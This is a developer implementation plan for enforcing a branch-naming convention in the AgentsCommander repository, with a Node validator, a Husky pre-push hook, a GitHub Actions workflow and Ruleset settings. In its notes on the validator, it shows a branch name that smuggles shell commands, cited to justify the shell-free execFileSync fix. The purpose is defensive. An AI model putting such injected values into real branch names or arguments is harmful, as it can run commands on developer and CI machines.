# Branch Name Enforcement — Issue #63

**Branch:** `feature/63-branch-name-enforcement`
**Issue:** https://github.com/mblua/AgentsCommander/issues/63
**Status:** READY FOR IMPLEMENTATION

---

## Problem

Branches land in the repo with arbitrary names and no traceability to the issue that motivated the work. There is no automated gate to block non-compliant names. This plan adds two enforcement layers (client-side pre-push + server-side GitHub Action) plus repository rules that require contributors to open a PR whose branch name follows a fixed pattern tying it to an open issue.

---

## Naming convention

**Pattern**:
```
<type>/<issue-number>-<slug>
```

**Rules**:
- `<type>` ∈ { `feature`, `fix`, `bug` }
- `<issue-number>` must reference an **open Issue** (not a PR) in `mblua/AgentsCommander`. Leading zeros not allowed.
- `<slug>` matches `[a-z0-9]+(?:-[a-z0-9]+)*`:
  - lowercase alphanumeric tokens separated by single dashes
  - no leading/trailing dashes, no consecutive dashes, no underscores, no uppercase
  - length cap: **50 characters** (total branch length stays under ~65 chars — comfortable in terminals, GitHub UI, and refspecs)

**Canonical regex** (single source of truth, used client and server):
```
^(feature|fix|bug)/([1-9][0-9]*)-([a-z0-9]+(?:-[a-z0-9]+)*)$
```

**Examples**:

| Branch | Valid? | Reason |
|---|---|---|
| `feature/63-branch-name-enforcement` | YES | matches pattern, issue #63 is open |
| `fix/42-pty-resize` | YES | matches pattern (assuming #42 open) |
| `bug/101-missing-idle-callback` | YES | matches pattern |
| `feat/63-foo` | NO | `feat` is not a recognized type |
| `feature/63_branch_name` | NO | underscores forbidden |
| `feature/63-Branch-Name` | NO | uppercase forbidden |
| `feature/63--doubledash` | NO | consecutive dashes |
| `feature/0-foo` | NO | leading zero / issue #0 invalid |
| `feature/999999-foo` | NO | if #999999 does not exist or is closed |
| `feature/63-` | NO | empty slug |
| `feature/63-a-very-very-very-…` (slug > 50 chars) | NO | slug length cap |

**Exempt prefixes** (validation skipped entirely):
- `main`
- `release/*`
- `hotfix/*`
- `dependabot/*`
- `revert/*`
- `gh-readonly-queue/*` (GitHub merge queue shadow branches)

---

## Architecture overview

```
                   ┌─────────────────────────────────────────────────┐
                   │ scripts/validate-branch-name.mjs (Node, no deps)│
                   │ single source of truth for the rules            │
                   └─────────────────────┬───────────────────────────┘
                                         │
                  ┌──────────────────────┴───────────────────────┐
                  │                                              │
          ┌───────┴────────┐                            ┌────────┴───────┐
          │ .husky/pre-push │ (local, pre-push)          │ GitHub Action  │ (server)
          │ node <script>   │                            │ node <script>  │
          │ --branch $b     │                            │ --branch $b    │
          │                 │                            │ --check-issue  │
          └─────────────────┘                            └────────────────┘
          Format + exempt +                              Format + exempt +
          grandfather                                    grandfather +
                                                         GitHub API: issue OPEN?

Status check on HEAD commit of feature branch → required by Ruleset → blocks PR merge.
Owner (`mblua`) is on the Ruleset bypass list → can continue local-merge to main.
```

**Why a shared Node script?**

- One file owns the rules. If the pattern changes, both layers update automatically.
- Node 20 is already required by the existing `.github/workflows/release.yml`. No new runtime.
- Only uses Node stdlib (`child_process`, `process`, global `fetch`) — zero new deps on the runner.

---

## Files to create

| # | Path | Purpose |
|---|---|---|
| 1 | `scripts/validate-branch-name.mjs` | Shared validator (pattern + exempt + grandfather + optional issue-open check) |
| 2 | `.husky/pre-push` | Hook that runs the validator for every ref being pushed |
| 3 | `.github/workflows/validate-branch-name.yml` | Server-side workflow publishing the required status check |
| 4 | `.github/branch-name-enforcement.cutoff.sha` | Pinned enforcement-cutoff SHA (G1). Placeholder in initial commit; real SHA recorded post-merge |
| 5 | `.gitattributes` | Pin LF line endings on `.husky/**` and `*.sh` so the hook works on Windows (E1) |
| 6 | `CONTRIBUTING.md` | Developer-facing docs: convention, setup, rejection flow, exempt prefixes, grandfather rule |

## Files to modify

| # | Path | Purpose |
|---|---|---|
| 7 | `package.json` | Add `husky` devDep, `prepare` script, `validate-branch-name` alias |
| 8 | `.gitignore` | Ignore `.husky/_` (husky-generated dir) |

---

## 1. `scripts/validate-branch-name.mjs` (NEW)

Full file contents. No external dependencies — only Node 20 stdlib and global `fetch`.

**Round-2 changes** in this block: pinned cutoff SHA (G1), fail-CLOSED on every git probe (G2), hardcoded upstream repo for issue lookups (G7), 10 s API timeout (G6/E6e), clearer 404 message (E6d), try/catch around top-level await (G11). `resolveRepoFromRemote` removed (G9 moot after G7).

**Round-3 changes** in this block: git helpers switched from `execSync(template_string)` to `execFileSync('git', argv_array, opts)` — **no shell invocation, no string interpolation of untrusted values** (R1, closes a command-injection PoC where git-allowed metacharacters in branch names — `` ` ``, `$()`, `;`, `&`, `|`, `<`, `>`, spaces — would execute under a shell). Cutoff-SHA regex is now case-insensitive, `[0-9a-fA-F]{40}` (R2).

```js
#!/usr/bin/env node
// Validates a git branch name against the project convention.
// Shared by .husky/pre-push (local) and .github/workflows/validate-branch-name.yml (server).
//
// Usage:
//   node scripts/validate-branch-name.mjs --branch <name> [--check-issue]
//   node scripts/validate-branch-name.mjs                  (auto-detects current branch)
//
// Exit codes:
//   0 → valid, exempt, or grandfathered
//   1 → invalid format, slug too long, issue missing/closed, timeout, or internal error

import { execFileSync } from 'node:child_process';

const PATTERN          = /^(feature|fix|bug)\/([1-9][0-9]*)-([a-z0-9]+(?:-[a-z0-9]+)*)$/;
const MAX_SLUG         = 50;
const TARGET_REPO      = 'mblua/AgentsCommander';                        // upstream only (G7)
const CUTOFF_SHA_PATH  = '.github/branch-name-enforcement.cutoff.sha';   // SHA file on main (G1)
const API_TIMEOUT_MS   = 10_000;                                         // hard cap on issue fetch (G6)
const SHA_RE           = /^[0-9a-fA-F]{40}$/;                            // case-insensitive (R2)
const EXEMPT = [
  /^main$/,
  /^release\//,
  /^hotfix\//,
  /^dependabot\//,
  /^revert\//,
  /^gh-readonly-queue\//,
];

function parseArgs(argv) {
  const out = { branch: null, checkIssue: false };
  for (let i = 0; i < argv.length; i++) {
    if (argv[i] === '--branch') out.branch = argv[++i];
    else if (argv[i] === '--check-issue') out.checkIssue = true;
  }
  return out;
}

function die(msg) {
  console.error(`[branch-name] ${msg}`);
  process.exit(1);
}

// ---- git helpers (argv-only, never via shell). R1 fix. ----
// Pass args as an array. execFileSync does NOT spawn a shell, so
// branch names and other refs containing shell metacharacters
// (`, $(), ;, &, |, <, >, spaces — all legal in git refs per
// check-ref-format) cannot be interpreted as commands.
function git(args) {
  return execFileSync('git', args, {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'ignore'],
  }).trim();
}
function gitOk(args) {
  try { execFileSync('git', args, { stdio: 'ignore' }); return true; }
  catch { return false; }
}

function resolveBranch() {
  if (process.env.GITHUB_REF_NAME) return process.env.GITHUB_REF_NAME;
  try { return git(['symbolic-ref', '--short', 'HEAD']); }
  catch { die('Could not resolve current branch (detached HEAD?). Pass --branch <name>.'); }
}

function isExempt(branch) {
  return EXEMPT.some(re => re.test(branch));
}

// Read the cutoff SHA from the file committed on origin/main.
// Any ambiguity (file missing, malformed, wrong length/charset) → return null.
// Caller treats null as "no cutoff recorded" → fail CLOSED (enforce).
function readCutoffSha() {
  let content;
  // CUTOFF_SHA_PATH is a constant literal. The argv form is still required
  // for consistency — every git invocation in this script is shell-free.
  try { content = git(['show', `origin/main:${CUTOFF_SHA_PATH}`]); }
  catch { return null; } // file not yet on origin/main (bootstrap / pre-merge)
  const first = content.split('\n', 1)[0].trim();
  if (!SHA_RE.test(first)) return null; // not a 40-char hex SHA
  return first;
}

// A branch is grandfathered iff a valid cutoff SHA is recorded AND
// that SHA is NOT an ancestor of the branch tip.
// Every git probe fails CLOSED (returns false → enforce). See G1/G2.
// All ref/SHA values pass as argv elements — no shell interpolation (R1).
function isGrandfathered(branch) {
  const cutoff = readCutoffSha();
  if (!cutoff) return false;                                                   // no cutoff → enforce
  if (!gitOk(['rev-parse', '--verify', `${cutoff}^{commit}`])) return false;    // cutoff obj missing → enforce
  if (!gitOk(['rev-parse', '--verify', branch])) return false;                  // branch unresolvable → enforce
  if (gitOk(['merge-base', '--is-ancestor', cutoff, branch])) return false;     // cutoff in ancestry → enforce
  return true;                                                                  // cutoff NOT in ancestry → grandfather
}

function validateFormat(branch) {
  const m = PATTERN.exec(branch);
  if (!m) {
    die(
      `Branch "${branch}" does not match the naming convention.\n` +
      `  Expected: <type>/<issue-number>-<slug>\n` +
      `    <type>   ∈ { feature | fix | bug }\n` +
      `    <issue>  = open GitHub issue number (no leading zeros)\n` +
      `    <slug>   = lowercase-kebab-case, [a-z0-9]+(-[a-z0-9]+)*, ≤ ${MAX_SLUG} chars\n` +
      `  Example:  feature/63-branch-name-enforcement`
    );
  }
  const [, type, issueStr, slug] = m;
  if (slug.length > MAX_SLUG) die(`Slug is ${slug.length} chars (max ${MAX_SLUG}). Shorten it.`);
  return { type, issue: Number(issueStr), slug };
}

async function verifyIssueOpen(issue) {
  const token = process.env.GH_TOKEN || process.env.GITHUB_TOKEN;
  if (!token) die(`Missing GH_TOKEN / GITHUB_TOKEN in environment — cannot verify issue #${issue}.`);
  const url = `https://api.github.com/repos/${TARGET_REPO}/issues/${issue}`;
  let res;
  try {
    res = await fetch(url, {
      signal: AbortSignal.timeout(API_TIMEOUT_MS),
      headers: {
        'Accept': 'application/vnd.github+json',
        'Authorization': `Bearer ${token}`,
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent': 'agentscommander-branch-validator',
      },
    });
  } catch (err) {
    if (err?.name === 'TimeoutError' || err?.name === 'AbortError') {
      die(`Timed out (${API_TIMEOUT_MS} ms) fetching issue #${issue} from GitHub API.`);
    }
    die(`Network error fetching issue #${issue}: ${err?.message || err}`);
  }
  if (res.status === 404) die(`Issue #${issue} not accessible in ${TARGET_REPO} (missing or auth-denied).`);
  if (!res.ok) die(`GitHub API error (${res.status}) while fetching issue #${issue}.`);
  const data = await res.json();
  if (data.pull_request) die(`#${issue} is a pull request, not an issue.`);
  if (data.state !== 'open') die(`Issue #${issue} is ${data.state}. Branch must reference an OPEN issue.`);
}

// ---- main (wrapped per G11 so every failure path prefixes with [branch-name]) ----
(async () => {
  try {
    const args   = parseArgs(process.argv.slice(2));
    const branch = args.branch || resolveBranch();

    if (isExempt(branch))        { console.log(`[branch-name] exempt: ${branch}`); process.exit(0); }
    if (isGrandfathered(branch)) { console.log(`[branch-name] grandfathered (cut before enforcement): ${branch}`); process.exit(0); }

    const { issue } = validateFormat(branch);
    if (args.checkIssue) await verifyIssueOpen(issue);

    console.log(`[branch-name] OK: ${branch}`);
    process.exit(0);
  } catch (err) {
    die(`Unexpected error: ${err?.message || err}`);
  }
})();
```

**Notes**:
- `--check-issue` is passed only by the GitHub Action. The pre-push hook does NOT require `gh` or any auth token locally; format + exempt + grandfather are enough at the client side. The server-side enforces the issue-open check authoritatively.
- **Grandfather logic is SHA-pinned, not path-derived.** `readCutoffSha()` reads `.github/branch-name-enforcement.cutoff.sha` on `origin/main`. If the SHA is not an ancestor of the branch tip, the branch is grandfathered. This defends against the "branch from pre-cutoff commit" bypass (G1) when combined with the mandatory Ruleset "Require branches to be up to date" rule (G3).
- **Every git probe fails CLOSED.** Missing objects, shallow clones, corrupt refs, unresolvable branches → `isGrandfathered` returns `false` → enforcement fires. This closes the "silent no-op" attack surface (G2).
- **Upstream repo is hardcoded** (`TARGET_REPO = 'mblua/AgentsCommander'`). A fork-triggered run that lacks upstream access will fail loudly with a clear 404 message — not silently pass on the fork's own issue namespace (G7).
- **10 s API timeout.** `AbortSignal.timeout(10_000)` prevents the workflow from sitting on a hung GitHub endpoint until the runner's 6 h cap (G6/E6e).
- **All failures flow through `die()`** — each line is prefixed with `[branch-name]` for grep-ability. A top-level try/catch converts any uncaught rejection into a `die()` too (G11).
- **No shell is ever spawned.** All git calls go through `execFileSync('git', argv, opts)`. A branch name like `` feature/63-pwn`;id>/tmp/x;`  `` is passed as a single argv element to git, which returns an "unresolvable ref" non-zero exit (→ fail CLOSED → enforce format). The previous round-2 design passed the same string through a shell context and would have executed the injected command on every pre-push and every CI run (R1).

---

## 2. `.husky/pre-push` (NEW)

```sh
# .husky/pre-push
# Pre-push hook: validates every branch ref being pushed against the naming convention.
# Bypass locally with `git push --no-verify` (server-side GitHub Action is authoritative).

# stdin lines from git: "<local_ref> <local_oid> <remote_ref> <remote_oid>"
while read -r local_ref local_oid remote_ref remote_oid; do
  # Skip branch deletions (local_oid is all zeros)
  if [ "$local_oid" = "0000000000000000000000000000000000000000" ]; then
    continue
  fi
  # Extract branch from refs/heads/<name>
  case "$local_ref" in
    refs/heads/*) branch="${local_ref#refs/heads/}" ;;
    *) continue ;; # tags and other refs are not validated
  esac
  node scripts/validate-branch-name.mjs --branch "$branch" || exit 1
done
exit 0
```

**Behavior**:
- Runs once per `git push`, reading all refs being pushed from stdin.
- Validates each branch ref; skips deletions (`0000...`) and non-branch refs (tags).
- On first failure, aborts the push with exit 1.
- Dev can bypass with `git push --no-verify` — this is acceptable per the spec ("safety net, not boundary").

**No shebang / no husky.sh source line required** — husky v9 runs hook files directly through its wrappers.

---

## 3. `.github/workflows/validate-branch-name.yml` (NEW)

**Round-2 changes**: dropped the broken `git fetch origin main --depth=0` step (G10 — invalid flag, redundant with checkout's `fetch-depth: 0`); added `concurrency:` to cancel superseded runs on force-push (G5); added `if:` guard that skips the run on branch-deletion pushes (G4).

```yaml
name: Validate branch name

on:
  push:
    branches-ignore:
      - main
      - 'release/**'
      - 'hotfix/**'
      - 'dependabot/**'
      - 'revert/**'
      - 'gh-readonly-queue/**'

permissions:
  contents: read
  issues: read

concurrency:
  group: validate-branch-name-${{ github.ref }}
  cancel-in-progress: true

jobs:
  validate-branch-name:
    name: validate-branch-name
    # Skip branch-deletion push events (after-SHA is all zeros). G4.
    if: github.event.deleted != true && github.event.after != '0000000000000000000000000000000000000000'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout (full history for grandfather ancestor check)
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Validate branch name and issue state
        env:
          GH_TOKEN: ${{ github.token }}
          GITHUB_REF_NAME: ${{ github.ref_name }}
        run: node scripts/validate-branch-name.mjs --branch "$GITHUB_REF_NAME" --check-issue
```

**Notes**:
- `on: push` with `branches-ignore` covers exempt prefixes at the trigger level. The Node script also exempts them defensively.
- `fetch-depth: 0` on `actions/checkout@v4` populates `refs/remotes/origin/main` and makes `git rev-parse --verify <cutoff>^{commit}` work. No additional fetch step needed (G10, E8 confirmed).
- `permissions: issues: read` is required to call `/repos/{owner}/{repo}/issues/{n}` on private repos (no-op on public ones, but safe to list).
- **The required status check name is `validate-branch-name`** — matches the job's explicit `name:`. This is the exact string to paste into the Ruleset's required-checks list (see E5 note in Ruleset recipe).
- `GITHUB_REPOSITORY` is no longer forwarded — the validator now hardcodes `mblua/AgentsCommander` per G7.

---

## 4. `.github/branch-name-enforcement.cutoff.sha` (NEW)

The **pinned enforcement-cutoff SHA** consumed by `isGrandfathered` in the validator. Round-2 G1/G13.

**Initial commit contents** (placeholder):

```
PENDING
```

That is the entire file — one line, no trailing noise. The placeholder is a non-SHA sentinel. `readCutoffSha()` returns `null` for any content that doesn't match `^[0-9a-fA-F]{40}$` (round-3 R2: case-insensitive, accepts either casing) and `isGrandfathered` then returns `false` → **enforcement fires for every branch until the real SHA is recorded**.

**Post-merge** (owner action, documented in Implementation order step 11): the file is overwritten with the merge commit SHA on a follow-up commit to `main`:

```
4f1a2b3c4d5e6f7890abcdef1234567890abcdef
```

(Exact SHA computed at merge time.)

**Why an in-tree file and not a git tag**:
- Committed files travel with `git push origin main` automatically; tags require an extra `git push --tags` that is easy to forget.
- The file is visible in tree, self-documenting, and reviewable like any other change.
- If the file is ever renamed without updating `CUTOFF_SHA_PATH` in `validate-branch-name.mjs`, the validator fails CLOSED (enforces every branch). The failure mode is **self-alarming** — every PR starts being rejected with "branch name does not match convention" — not silent. Contrast with the previous workflow-file-presence scheme (G13) where a rename silently bypassed enforcement forever.

---

## 5. `.gitattributes` (NEW)

Pin LF line endings on hook files so the pre-push hook runs correctly on Windows (E1).

```
.husky/** text eol=lf
*.sh      text eol=lf
```

**Why**: the primary dev machine is Windows (Tauri/ConPTY project). Git's `core.autocrlf=true` default on Windows rewrites committed files to CRLF on checkout. A shell hook committed with CRLF fails at runtime with `/usr/bin/env: 'node\r': No such file or directory`. Pinning `eol=lf` at the attribute level forces LF regardless of the dev's local `autocrlf`. Silent foot-gun otherwise.

---

## 6. `CONTRIBUTING.md` (NEW)

**Round-2 additions**: Windows-tooling note (G8); explicit mention of the mandatory Ruleset "up-to-date" rule (G3) so future maintainers don't disable it.

```markdown
# Contributing to AgentsCommander

## Branch naming

All new branches **must** follow this pattern and reference an **open GitHub Issue**:

```
<type>/<issue-number>-<slug>
```

| Field | Rules |
|---|---|
| `<type>` | One of `feature`, `fix`, `bug` |
| `<issue-number>` | An open issue in this repo (no leading zeros, e.g. `63` not `063`) |
| `<slug>` | Lowercase kebab-case, `[a-z0-9]+(-[a-z0-9]+)*`, at most 50 characters |

**Valid**:
- `feature/63-branch-name-enforcement`
- `fix/42-pty-resize-on-windows`
- `bug/101-missing-idle-callback`

**Invalid**:
- `feat/63-foo` — `feat` is not a recognized type
- `feature/63_branch_name` — underscores not allowed
- `feature/63-Branch-Name` — uppercase not allowed
- `feature/63--doubledash` — consecutive dashes not allowed
- `feature/0-foo` — leading zero / issue `#0`

### Exempt branches

The following prefixes skip validation:

- `main`
- `release/*`
- `hotfix/*`
- `dependabot/*`
- `revert/*`
- `gh-readonly-queue/*`

### Grandfather rule

Only branches whose history **does not yet contain** the enforcement-cutoff commit are skipped. The cutoff SHA is stored in `.github/branch-name-enforcement.cutoff.sha` on `main`. Old branches stay grandfathered until they are rebased onto (or merged with) current `main` — at which point the cutoff enters their ancestry and enforcement kicks in. This is intentional: once a branch catches up with main, its new name must comply.

## Enforcement

### Layer 1 — local pre-push hook (fast feedback)

Runs automatically on `git push` via [Husky](https://typicode.github.io/husky/). Installed for you when you run `npm install` (no extra steps).

- Validates the branch name format and the slug length.
- Does **not** verify the issue is open (that happens server-side).
- Bypass with `git push --no-verify` if you really need to — the server-side check is authoritative.

#### Windows tooling note

The pre-push hook is a POSIX shell script. Husky v9 invokes it via `sh`. On Windows, `sh` is provided by **Git for Windows / Git Bash**. If you use GitHub Desktop's bundled git, a git client without Git Bash on PATH, or a GUI tool with its own git binary, the hook may silently no-op and you will only see rejections from the server-side check.

**Recommended**: install [Git for Windows](https://gitforwindows.org/) and make sure its `bin/` is on your PATH. Verify with `sh --version`.

### Layer 2 — GitHub Action (authoritative, not bypassable by non-owners)

`.github/workflows/validate-branch-name.yml` runs on every push to a non-exempt branch. It:

1. Re-validates the branch name format.
2. Calls the GitHub API to confirm the referenced issue exists and is **open**.

The workflow publishes a status check named `validate-branch-name` on the branch's HEAD commit. A Repository Ruleset on `main` requires this check to pass before any PR can be merged, so non-compliant branches cannot land.

> **Maintainer note**: the Ruleset on `main` **must** have the *"Require branches to be up to date before merging"* rule enabled. That rule forces any PR to rebase/merge current `main` before merging, which puts the enforcement-cutoff SHA into the branch's ancestry and prevents the "branch from a pre-cutoff commit" bypass. **Do not disable this rule.**

## If your push is rejected

1. Read the error message — it says exactly what is wrong.
2. Find (or open) an issue that describes the work.
3. Rename the local branch:
   ```bash
   git branch -m <old-name> <new-name>
   ```
4. Delete the old remote ref (if you already pushed it):
   ```bash
   git push origin --delete <old-name>
   ```
5. Push the renamed branch:
   ```bash
   git push -u origin <new-name>
   ```
```

---

## 7. `package.json` — MODIFY

**Current** (lines 6-13):
```json
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "build:prod": "cross-env BUILD_PROFILE=prod tauri build --config src-tauri/tauri.prod.conf.json",
    "build:stage": "cross-env BUILD_PROFILE=stage tauri build --config src-tauri/tauri.stage.conf.json",
    "kill-dev": "powershell.exe -ExecutionPolicy Bypass -File ./scripts/kill-dev.ps1",
    "tauri": "tauri"
  },
```

**Change** — add `prepare` script and a convenience alias:
```json
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "build:prod": "cross-env BUILD_PROFILE=prod tauri build --config src-tauri/tauri.prod.conf.json",
    "build:stage": "cross-env BUILD_PROFILE=stage tauri build --config src-tauri/tauri.stage.conf.json",
    "kill-dev": "powershell.exe -ExecutionPolicy Bypass -File ./scripts/kill-dev.ps1",
    "validate-branch-name": "node scripts/validate-branch-name.mjs",
    "prepare": "husky",
    "tauri": "tauri"
  },
```

**Current** (lines 23-29):
```json
  "devDependencies": {
    "@tauri-apps/cli": "^2",
    "cross-env": "^10.1.0",
    "typescript": "^5",
    "vite": "^8.0.2",
    "vite-plugin-solid": "^2.11.11"
  }
```

**Change** — add `husky`:
```json
  "devDependencies": {
    "@tauri-apps/cli": "^2",
    "cross-env": "^10.1.0",
    "husky": "^9.1.7",
    "typescript": "^5",
    "vite": "^8.0.2",
    "vite-plugin-solid": "^2.11.11"
  }
```

**Why husky (not lefthook)**:
- Activated via the `prepare` npm lifecycle script → zero additional install steps for devs beyond `npm install` (spec requirement).
- `~1.4 kB` package, no native binary, works on Git Bash / MSYS / macOS / Linux.
- Husky v9 config is a single file per hook (`.husky/pre-push`) — no separate YAML or JSON config.
- Lefthook is also viable but ships platform-specific binaries and requires a separate config file; husky is strictly lighter for this one-hook use case.

---

## 8. `.gitignore` — MODIFY

**Current** (full file, 11 lines):
```
node_modules/
dist/
src-tauri/target/
*.log
.DS_Store
.agentscommander/

.ac-new/wg-1-ac-devs/

.ac-new/wg-2-ac-devs/

.ac-new/wg-3-ac-devs/
```

**Add** (after line 6, `.agentscommander/`):
```
.husky/_
```

**Why**: husky v9 writes its generated wrapper scripts to `.husky/_/`. That directory is machine-specific and re-created on every `npm install` via the `prepare` script. The user-authored hooks (`.husky/pre-push`) live in `.husky/` and **must** be committed.

---

## Grandfather strategy — detailed rationale (round-2 rewrite)

**The rule**: a branch is grandfathered iff **all** of the following hold:
1. `.github/branch-name-enforcement.cutoff.sha` exists on `origin/main` and contains a valid 40-char hex SHA.
2. The local git database has the cutoff commit (`git rev-parse --verify <cutoff>^{commit}` succeeds).
3. The branch ref is resolvable (`git rev-parse --verify <branch>` succeeds).
4. The cutoff SHA is **NOT** an ancestor of the branch tip (`git merge-base --is-ancestor <cutoff> <branch>` fails).

Any failure of steps 1-3 → `isGrandfathered` returns `false` → **enforcement fires** (fail CLOSED).

**Why SHA-pinned, not path-derived** (addresses G1, G2, G13):

| Previous scheme (round 1) | New scheme (round 2) |
|---|---|
| "Workflow file absent at merge-base" | "Cutoff SHA not ancestor of branch tip" |
| Bypass: branch from pre-cutoff commit → merge-base is pre-cutoff → file absent → grandfathered → merge lands | Attack is only closed in combination with Ruleset "up-to-date" rule, which forces the branch to ingest current main (and therefore the cutoff) before merge |
| Silent total bypass if workflow file is ever renamed without updating `WORKFLOW_PATH` | Silent total bypass requires renaming the SHA file AND any alarm mechanism; in the renamed-path case, validator fails CLOSED (enforces everything) — **self-alarming** |
| shOk swallows all git errors → any transient git failure silently grandfathers the branch | Every git probe fails CLOSED: missing cutoff file, malformed content, cutoff object absent, branch ref unresolvable, all → enforce |

**The load-bearing pairing with G3**:
The SHA-ancestor check alone does NOT stop a contributor from branching off an arbitrary pre-cutoff commit (their branch has no cutoff in ancestry → grandfather = true). What closes the hole is the Ruleset's **mandatory** "Require branches to be up to date before merging" rule. That rule forces the PR branch to rebase/merge current main before the merge button activates. Once rebased, the cutoff SHA is in the branch's ancestry → enforcement fires on the next workflow run → bad name rejected → PR blocked.

Without G3, the SHA-pinned scheme is just as bypassable as the path scheme. Without the SHA-pinned scheme, G3 alone is sufficient against this specific attack BUT the path scheme still carries G13 (silent rename bypass). Both changes together are the minimal safe design.

**Edge cases**:
- **Bootstrap** — before the cutoff SHA is recorded, the file either is absent on `origin/main` or contains `PENDING`. `readCutoffSha()` returns `null` → every branch is validated against format + issue rules, no grandfather anywhere. Safer default for the transition window between merge and SHA-recording.
- **Rebased old branch** — once a pre-cutoff branch is rebased onto current `main`, the cutoff SHA is in its ancestry → enforcement fires. Correct.
- **Local hook without `origin/main` fetched** — `git show origin/main:.github/branch-name-enforcement.cutoff.sha` fails → `readCutoffSha` returns `null` → format check runs. Strict-but-correct; dev can `git fetch origin` or `--no-verify`.
- **Rename the cutoff file without updating `CUTOFF_SHA_PATH`** — validator fails CLOSED, every PR starts being rejected with a loud format error. Self-alarming; maintainer notices instantly.
- **Fork-triggered run** — validator hardcodes `TARGET_REPO = 'mblua/AgentsCommander'` for the issue lookup. A fork's runner calling the upstream API may 404 (private) or succeed (public) — either way, the fork's check is informational; the upstream Ruleset only consumes upstream workflow runs. See round-2 G7.

---

## Ruleset configuration recipe

**Apply manually in the GitHub UI after this plan lands on `main`.** The Ruleset cannot be configured from the repo files — it is a GitHub-side setting.

1. Navigate to **https://github.com/mblua/AgentsCommander/settings/rules**.
2. Click **New branch ruleset**.
3. **Ruleset name**: `main: require PR + branch-name check`
4. **Enforcement status**: `Active`
5. **Bypass list**:
   - Click **Add bypass** → **Repository admin** (or the specific user `mblua`).
   - Set bypass mode to **Always**.
   - Rationale: the owner keeps the local-merge-to-main workflow. Ruleset only forces PRs on everyone else.
6. **Target branches**:
   - Click **Add target** → **Include default branch**. (This targets `main`.)
7. **Branch rules** — toggle the following:

   | Rule | State | Notes |
   |---|---|---|
   | Restrict creations | OFF | Irrelevant for this plan |
   | Restrict updates | OFF | Owner's local merges need to update main |
   | Restrict deletions | **ON** | Prevents accidental `main` deletion |
   | Require linear history | OFF | Owner's local flow uses merge commits |
   | Require deployments to succeed | OFF | Not applicable |
   | Require signed commits | OFF | Not required by spec |
   | **Require a pull request before merging** | **ON** | Force non-owners through PRs |
   | ↳ Required approvals | `0` | Owner is bypass; no other required reviewers yet |
   | ↳ Dismiss stale pull request approvals | OFF | |
   | ↳ Require review from Code Owners | OFF | No CODEOWNERS file |
   | ↳ Require approval of the most recent reviewable push | OFF | |
   | ↳ Require conversation resolution before merging | OFF | |
   | ↳ Allowed merge methods | Merge, Squash, Rebase (all allowed) | |
   | **Require status checks to pass** | **ON** | Core gate for branch-name validation |
   | ↳ **Require branches to be up to date before merging** | **ON** | **MANDATORY — closes the grandfather bypass (see G1/G3). Forces the PR branch to reach a post-enforcement merge-base before merge, which puts the cutoff SHA into the branch's ancestry and re-activates validation. Do NOT disable.** |
   | ↳ Add checks | `validate-branch-name` | **Exact match** for the workflow's job name. **E5**: after the workflow's first run, visit the commit page on GitHub, copy the exact check-name string from the checks list, and paste it here — case-sensitive, no leading/trailing whitespace. Rulesets silently fail to match a mistyped name. |
   | ↳ Source | `GitHub Actions` | |
   | **Block force pushes** | **ON** | Owner bypasses this via the Bypass list |
   | Require code scanning results | OFF | No code scanning set up |

8. Click **Create**.

**Verification after creation**:
- Open a throwaway branch named `test/invalid-name` (not `feature/*` etc.), push it, open a PR from it to `main`. The PR's "Merge" button should be disabled with a message citing the missing required check.
- Rename to `feature/63-test-ruleset`, force-push. The check should pass within ~30 s and the PR becomes mergeable (pending owner approval, if any).
- Delete the throwaway branch and close the PR.

---

## Implementation order

1. **Create `scripts/validate-branch-name.mjs`** — independent, no deps. Test locally with:
   ```bash
   node scripts/validate-branch-name.mjs --branch feature/63-branch-name-enforcement   # → OK
   node scripts/validate-branch-name.mjs --branch foo/bar                              # → exit 1
   node scripts/validate-branch-name.mjs --branch main                                 # → exempt
   ```
2. **Create `.gitattributes`** (E1) — pins LF on `.husky/**` and `*.sh`. Must land BEFORE the hook file.
3. **Modify `package.json`** — add `husky` devDep, `prepare` script, `validate-branch-name` alias.
4. **Modify `.gitignore`** — add `.husky/_`.
5. **Run `npm install`** — installs husky, triggers `prepare`, initializes `.husky/_/`. **Commit the resulting `package-lock.json` alongside `package.json`** (E3) so any future `npm ci` sees a stable tree.
6. **Create `.husky/pre-push`** — file contents per section 2. **Set the executable bit before committing** (E2):
   ```bash
   git update-index --add --chmod=+x .husky/pre-push
   ```
   Verify with `git ls-files --stage .husky/pre-push` → expect `100755`.
7. **Create `.github/workflows/validate-branch-name.yml`** — push the branch; the workflow runs on itself. The feature branch name is valid AND at this point the cutoff SHA file doesn't yet exist on `origin/main` → `readCutoffSha` returns null → enforcement runs → format check passes → issue #63 open check passes → green.
8. **Create `.github/branch-name-enforcement.cutoff.sha`** — initial content is the literal string `PENDING` on a single line. (The real SHA is recorded in step 11 after merge.)
9. **Create `CONTRIBUTING.md`** — docs only, no behavior change.
10. **Merge to `main` and capture MERGE_SHA in the same breath** (owner action, local flow — no PR). **Do NOT push yet.** Capturing immediately after the merge guarantees `HEAD` is the enforcement merge commit — a subsequent `git pull` or any other ref movement would make `git rev-parse HEAD` return the wrong commit (R3).
    ```bash
    git checkout main
    git fetch origin
    git merge --ff-only origin/main        # align local main with remote first
    git merge --no-ff feature/63-branch-name-enforcement -m "Merge feature/63-branch-name-enforcement"
    MERGE_SHA=$(git rev-parse HEAD)        # HEAD is the enforcement merge commit — capture NOW
    echo "Captured MERGE_SHA: $MERGE_SHA"  # sanity-print; must be 40-char hex
    ```
11. **Record the cutoff SHA in the same working tree** (owner, follow-up commit on top of the merge; `$MERGE_SHA` from step 10 is reused directly — HEAD is never re-read):
    ```bash
    echo "$MERGE_SHA" > .github/branch-name-enforcement.cutoff.sha
    git add .github/branch-name-enforcement.cutoff.sha
    git commit -m "chore(ci): record branch-name enforcement cutoff SHA"
    git push origin main                   # pushes the merge commit AND the cutoff-recording commit together
    ```
    Verify the committed content on the remote:
    ```bash
    git fetch origin
    git show origin/main:.github/branch-name-enforcement.cutoff.sha
    # → 40-char hex SHA matching $MERGE_SHA, no "PENDING", no trailing junk
    ```
12. **Apply the Ruleset in GitHub UI** (owner action, see recipe above). Pay attention to the **mandatory** "Require branches to be up to date before merging" rule — it is load-bearing for G1/G3.
